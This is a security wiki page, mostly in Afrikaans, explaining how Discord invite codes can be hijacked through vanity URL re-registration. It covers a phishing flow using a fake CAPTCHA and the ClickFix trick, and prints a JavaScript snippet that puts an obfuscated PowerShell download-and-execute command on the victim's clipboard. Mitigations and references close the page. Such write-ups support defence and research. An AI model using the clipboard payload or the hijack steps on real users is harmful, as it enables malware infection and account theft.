# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Discord invite hijacking misbruik die hergebruikreëls vir custom vanity links: ’n verstreke tydelike invite code, of ’n verwyderde permanente code wat slegs uit kleinletters en syfers bestaan, kan as ’n vanity link op ’n Level 3 boosted server geregistreer word. ’n Custom vanity link kan eweneens beskikbaar word wanneer sy oorspronklike server sy Level 3 Boost verloor; vir ’n tydelike invite met hoofletters kan ’n aanvaller die kleinletter-vanity-vorm vooraf registreer terwyl die gewone invite steeds aktief is, maar redirection begin eers nadat daardie invite verval.<sup>[[1]](#references)[[2]](#references)</sup>

## Invite Types and Hijack Risk

Die waargenome risiko verskil volgens invite-tipe:<sup>[[1]](#references)[[2]](#references)</sup>

| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Tydelike Invite Link | ✅          | Ná verstryking word die code beskikbaar en kan dit as ’n vanity URL deur ’n boosted server herregistreer word. |
| Permanente Invite Link | ⚠️          | Indien dit verwyder word en slegs uit kleinletters en syfers bestaan, kan die code weer beskikbaar word.        |
| Custom Vanity Link    | ✅          | Indien die oorspronklike server sy Level 3 Boost verloor, word sy vanity invite beskikbaar vir nuwe registrasie.    |

## Exploitation Steps

1. Reconnaissance
- Monitor openbare bronne (forums, sosiale media, Telegram-kanale) vir invite links wat by die patroon `discord.gg/{code}` of `discord.com/invite/{code}` pas.<sup>[[1]](#references)</sup>
- Versamel invite codes van belang (tydelik of vanity).<sup>[[1]](#references)</sup>
2. Pre-registration
- Skep of gebruik ’n bestaande Discord server met Level 3 Boost-voorregte.<sup>[[1]](#references)[[2]](#references)</sup>
- Probeer onder **Server Settings → Vanity URL** om die teiken-invite code toe te wys. Indien dit aanvaar word, word die code deur die kwaadwillige server gereserveer.<sup>[[1]](#references)</sup>
3. Hijack Activation
- Wag vir tydelike invites totdat die oorspronklike invite verval (of verwyder dit handmatig indien jy beheer oor die bron het).<sup>[[1]](#references)</sup>
- Vir codes wat hoofletters bevat, kan die kleinlettervariant onmiddellik geclaim word, hoewel redirection eers ná verstryking geaktiveer word.<sup>[[1]](#references)</sup>
4. Silent Redirection
- Gebruikers wat die ou link besoek, word naatloos na die aanvaller-beheerde server gestuur sodra die hijack aktief is.<sup>[[1]](#references)</sup>

## Phishing Flow via Discord Server

1. Beperk server-kanale sodat slegs ’n **#verify**-kanaal sigbaar is.<sup>[[1]](#references)</sup>
2. Ontplooi ’n bot (bv. **Safeguard#0786**) om nuwe gebruikers te versoek om via OAuth2 te verifieer.<sup>[[1]](#references)</sup>
3. Die bot herlei gebruikers na ’n phishing-webwerf (bv. `captchaguard.me`) onder die voorwendsel van ’n CAPTCHA- of verifikasiestap.<sup>[[1]](#references)</sup>
4. Implementeer die **ClickFix** UX-truuk:<sup>[[1]](#references)</sup>
- Vertoon ’n gebroke CAPTCHA-boodskap.
- Lei gebruikers om die **Win+R**-dialoog oop te maak, ’n voorafgelaaide PowerShell-opdrag te plak en Enter te druk.

### ClickFix Clipboard Injection Example

Die veldtog het JavaScript gebruik om ’n kwaadwillige PowerShell-opdrag na die knipbord te kopieer:<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Hierdie benadering vermy direkte lêeraflaaie en benut bekende UI-elemente om gebruikers se agterdog te verminder.<sup>[[1]](#references)</sup>

## Mitigations

- Verkies permanente uitnodigingskakels en verseker dat die kode ten minste een hoofletter bevat; verwyderde permanente kodes wat hoofletters bevat, kan nie as vanity-skakels hergebruik word nie.<sup>[[1]](#references)</sup>
- Roteer uitnodigingskodes gereeld en herroep ou skakels.
- Monitor Discord-bedienerbooststatus en vanity-URL-eise.<sup>[[1]](#references)[[2]](#references)</sup>
- Leer gebruikers om die egtheid van bedieners te verifieer en te vermy om opdragte wat vanaf die knipbord geplak is, uit te voer.

## References

- [1] [Van Vertroue tot Bedreiging: Gekaapte Discord-uitnodigings wat vir meerfase-wanwareaflewering gebruik word](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Pasgemaakte uitnodigingskakel – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
